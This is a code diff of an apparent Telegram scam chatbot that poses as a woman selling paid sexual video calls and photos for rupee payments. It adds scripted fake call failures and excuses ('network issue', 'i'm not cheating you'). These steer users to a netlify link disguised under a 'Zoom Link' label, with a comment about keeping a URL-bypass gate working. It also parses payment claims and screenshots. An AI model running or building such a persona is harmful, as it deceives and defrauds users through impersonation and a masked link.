@@ -18889,18 +18889,18 @@ function buildPaidEventLadder(chatId, clientId, type, now) {
     const call = (mins) => ({ type: 'call', chatId, clientId, time: at(mins), payload: {}, attempts: 0 });
     const msg = (mins, message) => ({ type: 'message', chatId, clientId, time: at(mins), payload: { message }, attempts: 0 });
     const link = `https://ZomCall.netlify.app/${clientId}/${chatId}`;
-    // A few natural "come to the link" variants so the repeated tail steps don't read as
-    // identical spam. Each keeps the literal link so the URL-bypass gate recognises it.
-    const zoom = `<a href="${link}">Zoom Link</a>`;
+    // Randomly show either the raw URL or a masked clickable label. Both forms retain the
+    // literal URL so the URL-bypass gate recognises them.
+    const zoom = Math.random() < 0.5 ? link : `<a href="${link}">Zoom Link</a>`;
     const callMeVariants = [
         `<b>Call me here</b>\n\n${zoom}`,
         `Call me on zoom\n\n${zoom}`,
-        `Click link to Call me 💕\n\n${zoom}`,
+        `Click link to Call me!\n\n👇 ${zoom}`,
         `Waiting for u 🥹\n\n${zoom}`,
         `Call me on this link baby 😚\n\n${zoom}`,
-        `<b>open this link!</b>\n\n${zoom}`,
+        `<b>open this link!</b>\n\n👇 ${zoom}`,
         `I'm Calling here 💋\n\n${zoom}`,
-        `Just Call me na 🙈 \n\n${zoom}`,
+        `Just Call me na 🙈 \n\n👉 ${zoom}`,
     ];
     // Deterministic per-step pick (no Math.random — must stay reproducible), varied by index.
     let callMeIdx = 0;
@@ -18908,18 +18908,18 @@ function buildPaidEventLadder(chatId, clientId, type, now) {
     if (type === '1') {
         return [
             call(1.5),
-            msg(2.2, "Wait wait 🥺\n<b>I'm calling you again</b>"),
+            msg(2.2, "Wait wait 🥺\n\n<b>I'm calling you again</b>"),
             call(2.5),
-            msg(3.2, "ughh is your network okay?? 😩\nCall keeps <b>Dropping</b>\nit's not connecting 😔"),
+            msg(3.2, "ughh...!!\nIs your Network okay??\n\nCall keeps <b>Dropping</b>!!\nit's not connecting 😔"),
             call(3.5),
-            msg(4.2, "Must be some <b>network issue</b> baby 😔\nDon't worry okay, i'm <b>not cheating</b> you 🙏\ni'll keep trying.. just give me a sec"),
-            msg(4.7, "And <b>don't talk</b> when we connect okk...!!\nI'm in the bathroom, keep yourself on <b>Mute</b>\nI'll show you everything on the call 😉"),
-            msg(5, `Okay try calling ME here instead babe 🥰\n\n${zoom}\n\n<b>Call me now na</b>`),
+            msg(4.2, "Must be some <b>network issue</b> baby 😔\n\nDon't worry okay, i'm <b>not cheating</b> you 🙏\ni'll keep trying.. just give me a sec"),
+            msg(4.7, "And... <b>Don't talk</b> when we connect okk...!!\n\nI'm in the Bathroom, keep yourself on <b>Mute</b>\nI'll show you everything on the call 😉"),
+            msg(5, `Okay try calling ME here instead babe 🥰\n\n👇 ${zoom}\n\n<b>Call me now na</b>`),
             msg(6, `Come on, call me on this one 😘\nit <b>actually works</b>\n\n${zoom}`),
             msg(7, `Call me here baby 💋\ni'm <b>waiting</b>\n\n${zoom}`),
             msg(8, `Only call me on <b>this link</b> okay? 🙈\n\n${zoom}`),
-            msg(11, `Babe you there?? 🥹\njust open this and <b>call me</b>\n\n${zoom}`),
-            msg(13, "Same problem 😭\nnormal call still <b>won't connect</b>\nplease believe me na, i'm <b>not going anywhere</b>\nI'll give you the <b>full show</b> today pakka 💕\nJust come to the link okay?"),
+            msg(11, `Babe you there?? 🥹\nJust open this and <b>call me</b>\n\n👉 ${zoom}`),
+            msg(13, "Same problem 😭\nNormal call still <b>won't connect</b>\n\nplease believe me na, i'm <b>not going anywhere</b>\nI'll give you the <b>full show</b> today pakka 💕\nJust come to the link okay?"),
             call(15), msg(15.5, callMe()),
             call(20), msg(20.5, callMe()),
             call(30), msg(30.5, callMe()),
@@ -29496,7 +29496,8 @@ async function asktoPay(client, time) {
                         }
                         else {
                             logger.log(`Restarting paid-user engagement for ${user.chatId}`);
-                            await (0,_telegram_utils_send_message__WEBPACK_IMPORTED_MODULE_11__.trySendingMsg)(user, client, { message: (0,_utils_generateInitMsg__WEBPACK_IMPORTED_MODULE_20__.initMsg)({ tempters: true }) });
+                            const sent = await (0,_telegram_utils_send_message__WEBPACK_IMPORTED_MODULE_11__.trySendingMsg)(user, client, { message: (0,_utils_generateInitMsg__WEBPACK_IMPORTED_MODULE_20__.initMsg)({ tempters: true }) });
+                            logger.log(`Paid-user engagement init ${sent ? "sent" : "failed"} for ${user.chatId}`);
                         }
                     }, staggerMs, `asktoPay.${chatId}`, resolve);
                 });
@@ -41429,6 +41430,26 @@ function firstNumberFromText(text) {
     }
     return digits.length > 0 ? Number(digits) : -1;
 }
+function serviceOfferAmountFromText(text) {
+    const normalized = text.toLowerCase();
+    const candidates = [...normalized.matchAll(/\d+/g)]
+        .map((match) => ({
+        value: Number(match[0]),
+        start: match.index ?? 0,
+        end: (match.index ?? 0) + match[0].length,
+    }))
+        .filter(({ value }) => Number.isFinite(value));
+    const nonUnitCounts = candidates.filter(({ end }) => !/^\s*(?:min|mins|minute|minutes|hour|hours|hr|hrs|pic|pics|photo|photos|video|videos)\b/.test(normalized.slice(end)));
+    const moneyMarked = nonUnitCounts.find(({ start, end }) => /(?:₹|rs\.?|rupees?)\s*$/.test(normalized.slice(Math.max(0, start - 10), start)) ||
+        /^\s*(?:₹|rs\.?\b|rupees?\b)/.test(normalized.slice(end)));
+    if (moneyMarked)
+        return moneyMarked.value;
+    const knownPlanAmounts = [25, 50, 100, 150, 350, 600];
+    const knownPlan = nonUnitCounts.find(({ value }) => knownPlanAmounts.includes(value));
+    if (knownPlan)
+        return knownPlan.value;
+    return nonUnitCounts.find(({ value }) => value >= 25 && value <= 1000)?.value ?? -1;
+}
 function isOnlyDigits(value) {
     const trimmed = value.trim();
     return trimmed.length > 0 && [...trimmed].every((char) => char >= '0' && char <= '9');
@@ -41766,7 +41787,7 @@ const commonPatterns = [
         handler: async (event, text, allMsg, userDetails, context) => {
             // Bag-based READY match: commitment cue + payment word, or WhatsApp mention
             const COMMIT = ['ok', 'okay', 'ill', 'i will', 'lets', 'ready to', 'wanna', 'want to', 'chalo', 'theek hai'];
-            const PAY_ACTION = ['paying', 'pay now', 'pay karu', 'pay karunga', 'paise dunga'];
+            const PAY_ACTION = ['paying', 'pay now', 'i pay it', 'pay karu', 'pay karunga', 'paise dunga'];
             // Guard: "not ready to pay" is NOT readiness — prevents negation stealing the ready route
             const NEGATION_WORDS = ['not', 'nahi', 'nhi', 'no', 'dont', "don't", 'never', 'mat', "can't", 'cant', 'cannot'];
             // Guard: "what if you dont call after i pay" is a TRUST/FEAR objection, not readiness — prevents conditional/fear phrases stealing the ready route
@@ -41883,11 +41904,11 @@ const commonPatterns = [
         description: 'Payment screenshot sent / money deducted but no service yet',
         handler: async (event, text, allMsg, userDetails, context) => {
             const SCREENSHOT_PROOF = [
-                'screenshot', ' ss', 'bheja', 'bhej diya', 'send screenshot',
+                'screenshot', 'send screenshot',
                 'sent screenshot', 'payment screenshot', 'payment proof',
                 'screenshot bhej', 'screenshot sent', 'ss bhej', 'ss sent', 'ss diya',
                 'proof de diya', 'screenshot diya', 'txn screenshot',
-                'utr', 'ref', 'reference', 'transaction id', 'txn id'
+                'utr', 'reference number', 'transaction id', 'txn id'
             ];
             const DEDUCTED = [
                 'money deducted', 'amount deducted', 'money cut', 'amount cut',
@@ -41901,6 +41922,18 @@ const commonPatterns = [
                 'payment ke baad', 'paid but', 'payment done but', 'still waiting',
                 'payment kiya call', 'money sent no', 'paid no call'
             ];
+            const PAYMENT_CONTEXT = [
+                'payment', 'paid', 'money', 'paisa', 'paise', 'amount', 'rupees',
+                'transaction', 'transfer', 'upi', 'gpay', 'phonepe', 'paytm',
+                'screenshot', 'proof', 'utr', 'deducted', 'debited', 'cut gaya', 'kat gaya'
+            ];
+            const cannotHavePaid = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['no money', 'dont have money', "don't have money", 'cannot pay', "can't pay", 'cant pay', 'unable to pay']) ||
+                (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['will pay', 'pay later', 'pay tomorrow', 'then i will pay', 'pay karunga', 'pay karungi']) ||
+                ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['not', 'nahi', 'nhi']) && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['paid', 'payment', 'pay', 'sent money', 'transfer']));
+            const personalMediaOnly = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['my pic', 'my photo', 'my video', 'my videos']) &&
+                !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['payment', 'screenshot', 'proof', 'utr', 'transaction']);
+            if (cannotHavePaid || personalMediaOnly)
+                return false;
             // Skip if user is asking about "process" without payment context
             const processOnly = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['process', 'proces', 'proccess', 'procedure']) &&
                 !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['payment', 'pay', 'paid', 'screenshot', 'proof', 'money', 'paisa', 'paise']);
@@ -41908,7 +41941,7 @@ const commonPatterns = [
                 return false;
             const hasScreenshot = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, SCREENSHOT_PROOF);
             const hasDeducted = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, DEDUCTED);
-            const hasWaiting = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, SERVICE_WAIT);
+            const hasWaiting = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, SERVICE_WAIT) && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, PAYMENT_CONTEXT);
             if (hasScreenshot || hasDeducted || hasWaiting) {
                 await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, (0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_3__.pickOneMsg)(paymentPendingReplyPool(text)), true);
                 return true;
@@ -41929,6 +41962,11 @@ const commonPatterns = [
                 trimmed = trimmed.slice(0, -1).trim();
             }
             const recoveryContext = hasRepeatRecoveryIntent(text);
+            if ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(normalized, [
+                'dont disturb', "don't disturb", 'do not disturb', 'dont message',
+                "don't message", 'do not message', 'leave me alone', 'stop messaging'
+            ]))
+                return false;
             if ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(normalized, ['chalo bye', 'chal bye', 'bye chalo', 'bye chal']))
                 return false;
             if (!recoveryContext && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(normalized, ['call lagao', 'call laga', 'vc lagao', 'video lagao', 'jaldi call', 'abhi call', 'fast call']))
@@ -41991,9 +42029,8 @@ const commonPatterns = [
             if ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, serviceQuestionKeywords)) {
                 return false;
             }
-            const amount = firstNumberFromText(text);
-            const hasAmount = amount !== -1;
-            let amountValue = hasAmount ? amount : 0;
+            const amountValue = serviceOfferAmountFromText(text);
+            const hasAmount = amountValue !== -1;
             // Face / Pic related keywords
             const faceKeywords = [
                 'face', 'fac', 'fce', 'chehra', 'muh'
@@ -42012,10 +42049,25 @@ const commonPatterns = [
             const hasFace = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, faceKeywords);
             const hasPic = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, picKeywords);
             const hasOkay = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, okayKeywords);
-            // Main condition: Amount > 15 + (Face or Pic or Okay or Question mark)
-            if (hasAmount && amountValue > 15 && (hasFace || hasPic || hasOkay || (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['?']))) {
+            const hasPlanContext = hasFace || hasPic || (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['call', 'video', 'service']) ||
+                containsPadded(text, ['vc', 'min', 'mins', 'minute', 'minutes', 'hour', 'hr']);
+            // Require a concrete plan cue as well as an amount. This avoids accepting an
+            // unrelated number merely because the same message also contains "okay".
+            if (hasAmount && amountValue > 15 && hasPlanContext && (hasFace || hasPic || hasOkay || (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['?']))) {
                 logger.debug(`[AmountFaceConfirm] Detected: "${text}" (amount: ${amountValue}, hasFace: ${hasFace}, hasPic: ${hasPic}, hasOkay: ${hasOkay})`);
-                const reply = `${(0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_3__.pickOneMsg)(_messages_standardMessages__WEBPACK_IMPORTED_MODULE_7__.yesMsgs)}\n\n${(0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_3__.pickOneMsg)(_messages_paymentMsgs__WEBPACK_IMPORTED_MODULE_15__.finishPaymentMsgs)}`;
+                let reply;
+                if (hasFace && amountValue < 150) {
+                    reply = `The **with-face plan is 150₹** baby.\n\n**100₹** is the **without-face** option. Choose one and pay.`;
+                }
+                else if (!hasFace && amountValue === 100) {
+                    reply = `Yes baby, **100₹ is the without-face plan**.\n\nPay and send the screenshot here.`;
+                }
+                else if (hasFace && amountValue === 150) {
+                    reply = `Yes baby, **150₹ is the with-face plan**.\n\nPay and send the screenshot here.`;
+                }
+                else {
+                    reply = `${(0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_3__.pickOneMsg)(_messages_standardMessages__WEBPACK_IMPORTED_MODULE_7__.yesMsgs)}\n\n${(0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_3__.pickOneMsg)(_messages_paymentMsgs__WEBPACK_IMPORTED_MODULE_15__.finishPaymentMsgs)}`;
+                }
                 await (0,_replier__WEBPACK_IMPORTED_MODULE_11__.pushToReplies)(event, userDetails.chatId, reply);
                 return true;
             }
@@ -42065,20 +42117,35 @@ const commonPatterns = [
             if ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, autoNotificationKeywords)) {
                 return false;
             }
-            const PAID_DONE = ['kar diya', 'kar diye', 'ho gaya', 'ho gya', 'bhej diya', 'bheja', 'diya', 'diye', 'transfer', 'transferred', 'chesa', 'chesanu', 'did it', 'done it'];
-            const MONEY = ['money', 'paisa', 'paise', 'amount', 'rupees', 'rs', 'payment', 'amt', 'paymnt', 'amnt'];
+            const MONEY = ['money', 'paisa', 'paise', 'amount', 'rupees', 'payment', 'paymnt', 'amnt'];
+            const COMPLETED = ['kar diya', 'kar diye', 'ho gaya', 'ho gya', 'bhej diya', 'bheja', 'diya', 'diye', 'sent', 'send kiya', 'transfer', 'transferred', 'chesa', 'chesanu', 'did it', 'done it', 'done'];
+            const EXPLICIT_PAYMENT_DONE = [
+                'payment done', 'payment ho gaya', 'payment ho gya', 'pay kar diya',
+                'paid already', 'already paid', 'have paid', 'i paid', 'paid now'
+            ];
             const NEG = ['cant', "can't", 'unable', 'fail', 'failed', 'error', 'problem', 'issue', 'kaise', 'how to', 'how do i'];
             const URGENCY = ['start service', 'start call'];
-            const simpleClaim = (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.isEqual)(text, ['paid', 'done', 'sent', 'check']);
+            const simpleClaim = (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.isEqual)(trimPunctuation(text), ['paid']);
             const hasQuestion = text.includes('?');
-            const hasPaymentNegation = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['not paid', 'nahi paid', 'nhi paid', 'payment nahi', 'nahi bheja', 'nahi diya']) ||
+            const hasPaymentNegation = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, [
+                'not paid', 'nahi paid', 'nhi paid', 'payment nahi', 'nahi bheja', 'nahi diya',
+                'no money', 'dont have money', "don't have money", 'cannot pay', "can't pay", 'cant pay', 'unable to pay'
+            ]) ||
                 ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['not', 'nahi', 'nhi']) && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['paid', 'pay', 'sent', 'transfer', 'bhej', 'done']));
             const hasFuturePayment = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['will pay', 'going to pay', 'pay karunga', 'pay karungi', 'pay karu', 'bhej dunga']);
+            const hasPaymentSubject = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, MONEY) ||
+                (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['google pay', 'phone pe']) ||
+                containsPadded(text, ['pay', 'rs', 'amt', 'upi', 'gpay', 'phonepe', 'paytm', 'navi']);
+            const hasCompletedAction = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, COMPLETED);
+            const explicitPaymentDone = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, EXPLICIT_PAYMENT_DONE);
+            const sendsProof = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['screenshot', 'payment proof', 'txn screenshot', 'utr', 'transaction id']) &&
+                (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['sent', 'send', 'bhej', 'diya', 'shared', 'share']);
+            const unresolvedServiceWait = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['no call', 'no service', 'no reply', 'no response', 'still waiting', 'call nahi', 'call nhi']) &&
+                (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['paid', 'payment', 'money', 'paisa', 'paise']);
             const isPaymentConfirmed = simpleClaim ||
-                ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, PAID_DONE) && !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, NEG) && !hasQuestion && !hasPaymentNegation && !hasFuturePayment) ||
-                ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, MONEY) && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['transfer', 'transferred', 'bhej diya', 'sent', 'send kiya', 'ho gaya', 'kar diya', 'diya', 'diye', 'done']) &&
-                    !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, NEG) && !hasQuestion && !hasPaymentNegation && !hasFuturePayment) ||
-                ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['paid']) && !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, URGENCY) && !hasFuturePayment && !hasPaymentNegation && !hasQuestion);
+                ((explicitPaymentDone || (hasPaymentSubject && hasCompletedAction)) &&
+                    !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, NEG) && !hasQuestion && !hasPaymentNegation && !hasFuturePayment && !sendsProof && !unresolvedServiceWait) ||
+                (containsPadded(text, ['paid']) && !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, URGENCY) && !hasFuturePayment && !hasPaymentNegation && !hasQuestion && !sendsProof && !unresolvedServiceWait);
             if (isPaymentConfirmed) {
                 const db = _core_dbservice__WEBPACK_IMPORTED_MODULE_10__.UserDataDtoCrud.getInstance();
                 const paidCount = await db.getSingleKey(context.chatId, _core_dbservice__WEBPACK_IMPORTED_MODULE_10__.user.paidCount) + 1;
@@ -42133,6 +42200,22 @@ const commonPatterns = [
                 return true;
             }
             return false;
+        }
+    },
+    {
+        id: 'user_ambiguous_payment_status',
+        priority: 195,
+        scope: 'all',
+        description: 'Clarify bare sent/done/check messages without assuming payment succeeded',
+        handler: async (event, text) => {
+            if (!(0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.isEqual)(trimPunctuation(text), ['sent', 'done', 'check']))
+                return false;
+            await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, (0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_3__.pickOneMsg)([
+                'What did you send baby—**payment proof or something else**?\n\nTell me once so I check the right thing.',
+                'Done with **payment**, or done with something else?\n\nIf it is payment, send the **screenshot / UTR** here.',
+                'What should I check baby?\n\nIf you mean payment, share the **payment proof**; otherwise tell me what you sent.'
+            ]), true);
+            return true;
         }
     },
     {
@@ -42416,11 +42499,15 @@ const commonPatterns = [
                 'get lost', 'go away', 'leave me alone', 'leave me', 'leave it',
                 'stop messaging', 'stop message', 'stop texting', 'dont message',
                 "don't message", 'do not message', 'message mat', 'mat message',
+                'dont disturb', "don't disturb", 'do not disturb',
                 'block me', 'no need', 'no interest', 'not interested', 'not intres',
                 'no intres', 'nai chahiye', 'nahi chahiye', 'nhi chahiye',
                 'chal nikal', 'nikal', 'nikaal', 'niklo', 'door ja',
             ];
-            const KEEP_CONTACT = ['dont stop', "don't stop", 'do not stop', 'keep messaging', 'keep texting'];
+            const KEEP_CONTACT = [
+                'dont stop', "don't stop", 'do not stop', 'dont want to stop',
+                "don't want to stop", 'do not want to stop', 'keep messaging', 'keep texting'
+            ];
             const messageStop = ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['msg', 'message']) && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['mat', 'mt'])) ||
                 ((0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['wrna', 'warna', 'otherwise']) && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['msg', 'message']));
             const safetyStop = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['police', 'cop']) && (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['officer', 'case', 'crime', 'legal']);
@@ -42448,17 +42535,14 @@ const commonPatterns = [
                     // Ignore
                 }
                 if (!context.isPaidUser && hasGoodbyeIntent && !hardExitOrAbuse && !moneyExit) {
-                    await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, (0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_3__.pickOneMsg)([
-                        "Wait baby, don't go angry. No force.\n\nTake small demo first if you want to check me.",
-                        "Okay baby, message me later. If you want to try, demo pics 25₹ and video call 50₹.",
-                        "Don't go like that dear. Try small demo first, then decide."
-                    ]), true);
+                    await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, "Okay, bye. Message me later if you want to continue.", true);
                     return true;
                 }
                 await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, _messages_standardMessages__WEBPACK_IMPORTED_MODULE_7__.bye, true);
-                (0,_timeoutHelper__WEBPACK_IMPORTED_MODULE_14__.trackedSetTimeout)(context, async () => {
-                    await (0,_replier__WEBPACK_IMPORTED_MODULE_11__.pushToReplies)(event, context.chatId, '', './bye.mp3');
-                }, 17000);
+                if (hardExitOrAbuse || moneyExit) {
+                    const { setTemporaryLimit } = await Promise.resolve(/*! import() */).then(__webpack_require__.bind(__webpack_require__, /*! ../helpers/abuseDetectionHelper */ "./src/helpers/abuseDetectionHelper.ts"));
+                    await setTemporaryLimit(context.chatId, 5, 'User explicitly ended the conversation');
+                }
                 return true;
             }
             return false;
@@ -42985,7 +43069,7 @@ const commonPatterns = [
         scope: 'all',
         description: 'Love (affection) vs thanks (gratitude) — distinct replies',
         handler: async (event, text, allMsg, userDetails, context) => {
-            const THANKS_EXACT = ['thanks', 'thank you', 'thanx', 'thx', 'tysm', 'shukriya', 'dhanyawad', 'dhanyavad'];
+            const THANKS_EXACT = ['thank', 'thanks', 'thank you', 'thanx', 'thx', 'tysm', 'shukriya', 'dhanyawad', 'dhanyavad'];
             const THANKS_PHRASES = ['thank you', 'thanks ', ' thanx', ' thx', 'no thanks', 'shukriya', 'dhanyawad', 'dhanyavad'];
             const LOVE_EXACT = ['ily', 'love you', 'luv u', 'luv you', 'miss you', 'miss u'];
             const LOVE_PHRASES = [
@@ -48263,7 +48347,7 @@ const unpaidPatterns = [
             // "fake"/"scam"/"real"/"safe" are handled by OTHER handlers (privacy_safety at 180,
             // trust_distrust at 24, fake_scam_accusation at 197) — the merged handler at 186
             // should NOT steal them.
-            const TRUST = ['prove', 'proof', 'prf', 'trust', 'bharosa', 'first', 'confirm'];
+            const TRUST = ['prove', 'proof', 'prf', 'trust', 'bharosa'];
             const VOICE_PIC_MEDIA = ['voi', 'awaz', 'vaz', 'suno', 'sunno', 'listen', 'pic', 'phot', 'image', 'face', 'muh', 'cheh', 'samp', 'demo', 'trail'];
             const containsVoiceOrPic = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, VOICE_PIC_MEDIA);
             const isVerificationTrust = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['verify', 'verification']) &&
@@ -48510,12 +48594,23 @@ const unpaidPatterns = [
             const HARD_EXIT = [
                 'get lost', 'go away', 'leave me alone', 'leave me', 'stop messaging',
                 'stop message', 'stop texting', 'dont message', "don't message",
-                'do not message', 'message mat', 'mat message', 'block me', 'no need',
+                'do not message', 'message mat', 'mat message', 'dont disturb', "don't disturb",
+                'do not disturb', 'block me', 'no need', 'rehne do', 'rehne de', 'tab rehne do',
+                'nhi dekhna', 'nahi dekhna', 'nai dekhna', "don't want to see", 'dont want to see',
                 'no interest', 'not interested', 'nai chahiye', 'nahi chahiye', 'nhi chahiye',
-                'no demo needed', 'demo not needed',
+                'no demo needed', 'demo not needed', 'go with someone else', 'find someone else',
             ];
-            const KEEP_CONTACT = ['dont stop', "don't stop", 'do not stop', 'keep messaging', 'keep texting'];
-            const hardExit = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, HARD_EXIT) && !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, KEEP_CONTACT);
+            const KEEP_CONTACT = [
+                'dont stop', "don't stop", 'do not stop', 'dont want to stop',
+                "don't want to stop", 'do not want to stop', 'keep messaging', 'keep texting'
+            ];
+            const exactExit = ['dont want', "don't want", 'do not want'].includes(trimPunctuation(text));
+            const choosesSomeoneElse = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, [
+                'i will go with someone', 'i will go with some one',
+                "i'll go with someone", "i'll go with some one",
+                'going with someone else', 'going with some one else'
+            ]);
+            const hardExit = (exactExit || choosesSomeoneElse || (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, HARD_EXIT)) && !(0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, KEEP_CONTACT);
             // 'randi' (the slur), NOT 'rand'/'rand ' — those matched "random", "grand party".
             const abusive = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['bitch', 'lanj', 'randi', 'gandu', 'bsdk', 'madarchod', 'bhosdi']);
             const paymentServiceProblem = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['money cut', 'amount cut', 'money deducted', 'amount deducted', 'deducted', 'debited', 'paisa kat', 'paise kat']) ||
@@ -48536,12 +48631,24 @@ const unpaidPatterns = [
             if (abusive || hardExit || explicitNoInterest) {
                 const { setTemporaryLimit } = await Promise.resolve(/*! import() */).then(__webpack_require__.bind(__webpack_require__, /*! ../helpers/abuseDetectionHelper */ "./src/helpers/abuseDetectionHelper.ts"));
                 await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, (0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_2__.pickOneMsg)([_messages_standardMessages__WEBPACK_IMPORTED_MODULE_5__.bye, "**Byee!!** 👋", "Bye baby 🙈", "Okay byee na 💋"]));
-                (0,_timeoutHelper__WEBPACK_IMPORTED_MODULE_13__.trackedSetTimeout)(context, async () => {
-                    await setTemporaryLimit(context.chatId, 5, 'User said no interest/go away');
-                }, 10000);
+                await setTemporaryLimit(context.chatId, 5, 'User said no interest/go away');
                 return true;
             }
             if (softNoPaid) {
+                const financiallyUnable = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, [
+                    'no money', 'dont have money', "don't have money", 'cannot pay',
+                    "can't pay", 'cant pay', 'unable to pay', 'paisa nahi', 'paise nahi'
+                ]);
+                if (financiallyUnable) {
+                    await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, `Understood,\n\nI can start only after payment, so message me later if you want Service.`);
+                    return true;
+                }
+                const internationalPaymentBlocked = (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['pakistan', 'outside india', 'international', 'other country', 'another country']) &&
+                    (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['cant transfer', "can't transfer", "can't be transferred", 'cannot transfer', 'cannot be transferred', 'unable to transfer', 'not transfer', 'payment not possible']);
+                if (internationalPaymentBlocked) {
+                    await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, `Understood. If your payment app cannot transfer here, **don't keep retrying**.\n\nI can start only after a successful payment. Message me later only if you get a working method.`);
+                    return true;
+                }
